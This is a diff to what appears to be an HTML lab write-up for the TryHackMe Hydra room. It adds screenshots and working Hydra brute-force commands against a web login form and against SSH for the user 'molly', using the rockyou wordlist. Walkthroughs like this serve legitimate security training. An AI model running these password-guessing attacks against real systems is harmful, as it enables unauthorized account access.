@@ -59,8 +59,13 @@
   <br>
     <h2>Actual Command in my Environment</h2>
     <pre><code>hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.136.14 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is correct."</code></pre>
+    <img width="932" alt="Screenshot 2024-05-21 at 6 16 07 PM" src="https://github.com/Fabiany-cs/Hydra/assets/107880960/9463dee7-a046-447f-b364-059405e4f973">
+    <h2>SSH Brute Force</h2>
+    <pre><code>hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.230.142 -t 4 ssh"</code></pre>
+    <img width="1166" alt="Screenshot 2024-05-21 at 7 08 40 PM" src="https://github.com/Fabiany-cs/Hydra/assets/107880960/8099c5de-dac2-4ab2-b5e5-278f74496b79">
+    <li>Now ssh into the account and capture the THM flag.</li>
+    <img width="1166" alt="Screenshot 2024-05-21 at 7 09 37 PM" src="https://github.com/Fabiany-cs/Hydra/assets/107880960/1f88a940-49d2-42d3-b91d-7916fdb514ad">
     <h2>Conclusion</h2>
     <p>By following these steps, you can successfully use Hydra to brute-force login credentials in the TryHackMe Hydra lab. Remember to replace placeholder values with actual data from your lab environment.</p>
-    <img width="932" alt="Screenshot 2024-05-21 at 6 16 07 PM" src="https://github.com/Fabiany-cs/Hydra/assets/107880960/9463dee7-a046-447f-b364-059405e4f973">
 </body>
 </html>
